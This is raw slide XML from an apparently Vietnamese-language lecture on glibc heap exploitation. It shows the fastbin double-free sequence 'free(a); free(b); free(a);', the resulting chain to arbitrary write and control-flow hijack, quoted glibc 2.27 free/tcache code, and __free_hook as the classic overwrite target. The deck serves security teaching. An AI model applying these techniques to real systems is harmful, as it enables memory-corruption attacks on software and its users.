          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6400800" y="1874520"/>
            <a:ext cx="5120640" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>free(a); free(b); free(a);</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6400800" y="2377440"/>
            <a:ext cx="914400" cy="45720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a</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="2606040"/>
            <a:ext cx="411480" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="22225">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7772400" y="2377440"/>
            <a:ext cx="914400" cy="45720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b</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8686800" y="2606040"/>
            <a:ext cx="411480" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="22225">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9144000" y="2377440"/>
            <a:ext cx="914400" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent2"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:schemeClr val="accent2"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="762" tIns="762" rIns="762" bIns="762"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a</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6400800" y="2971800"/>
            <a:ext cx="5120640" cy="594360"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>fastbin chỉ so với phần tử đầu danh sách, nên free xen kẽ vẫn qua</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Shape 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="3931920"/>
            <a:ext cx="11274552" cy="2286000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3200"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent2"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="4069080"/>
            <a:ext cx="3657600" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>HỆ QUẢ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="4480560"/>
            <a:ext cx="2468880" cy="1463040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent6"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="762" tIns="762" rIns="762" bIns="762" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>malloc()</a:t>
            </a:r>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> kế tiếp trả lại vùng đã free hai lần</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3520440" y="4480560"/>
            <a:ext cx="2468880" cy="1463040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent6"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="762" tIns="762" rIns="762" bIns="762"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Hai con trỏ cùng trỏ một vùng nhớ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6309360" y="4480560"/>
            <a:ext cx="2468880" cy="1463040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent6"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="762" tIns="762" rIns="762" bIns="762"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Một con trỏ ghi đè dữ liệu / metadata</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9098280" y="4480560"/>
            <a:ext cx="2468880" cy="1463040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent2"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:schemeClr val="accent2"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="762" tIns="762" rIns="762" bIns="762"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Giả mạo con trỏ, ghi tuỳ ý, chiếm luồng thực thi</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Shape 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3200400" y="5212080"/>
            <a:ext cx="320040" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="22225">
            <a:solidFill>
              <a:schemeClr val="accent2"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Shape 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5989320" y="5212080"/>
            <a:ext cx="320040" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="22225">
            <a:solidFill>
              <a:schemeClr val="accent2"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Shape 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8778240" y="5212080"/>
            <a:ext cx="320040" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="22225">
            <a:solidFill>
              <a:schemeClr val="accent2"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>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Vị trí #1: free() gọi __free_hook trước tiên</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3 · glibc-2.27 malloc/malloc.c:3085</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1417320"/>
            <a:ext cx="6035040" cy="4800600"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1524"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent6"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1554480"/>
            <a:ext cx="5669280" cy="457200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void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__libc_free (void *mem)</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mstate ar_ptr;</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mchunkptr p;</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b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>  void (*hook) (void *, const void *)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>    = atomic_forced_read (__free_hook);</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>  if (__builtin_expect (hook != NULL, 0))</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>    {</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>      (*hook)(mem, RETURN_ADDRESS (0));</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>      return;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent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if (mem == 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 = mem2chunk (mem);</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p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6720840" y="1417320"/>
            <a:ext cx="5010912" cy="1600200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4571"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6903720" y="1581912"/>
            <a:ext cx="464515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DÒNG ĐẦU TIÊN</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6903720" y="1874520"/>
            <a:ext cx="4645152" cy="1033272"/>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Không kiểm tra con trỏ, mà đọc con trỏ hàm toàn cục </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>__free_hook</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> (malloc.c:1864).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6720840" y="3246120"/>
            <a:ext cx="5010912" cy="1463040"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6903720" y="3410712"/>
            <a:ext cx="464515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NẾU HOOK KHÁC NULL</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6903720" y="3703320"/>
            <a:ext cx="4645152" cy="896112"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>free()</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> gọi thẳng hook rồi return, bỏ qua toàn bộ logic allocator, kể cả </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>mem2chunk</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6720840" y="4937760"/>
            <a:ext cx="5010912" cy="1280160"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5714"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent1"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6903720" y="5102352"/>
            <a:ext cx="4645152"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MỤC TIÊU GHI ĐÈ KINH ĐIỂN</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6903720" y="5394960"/>
            <a:ext cx="4645152" cy="713232"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>glibc 2.26–2.28 vẫn còn hook (Sink B). glibc 2.34 gỡ hẳn cơ chế này.</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Vị trí #2: _int_free chỉ hỏi bin còn chỗ không</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3 · malloc.c:4165–4177 · 2926–2946</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1417320"/>
            <a:ext cx="5522976" cy="2606040"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2807"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent6"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1554480"/>
            <a:ext cx="5157216" cy="237744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#if USE_TCACHE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size_t tc_idx = csize2tidx (size);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if (tcache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&amp;&amp; tc_idx &lt; mp_.tcache_bins</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        &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)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        tcache_put (p, tc_idx);</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return;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#endif</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="4206240"/>
            <a:ext cx="5522976" cy="2011680"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3636"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent6"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="4343400"/>
            <a:ext cx="5157216" cy="1783080"/>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static void tcache_put (mchunkptr chunk, size_t tc_idx)</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tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</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assert (tc_idx &lt; TCACHE_MAX_BINS);</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
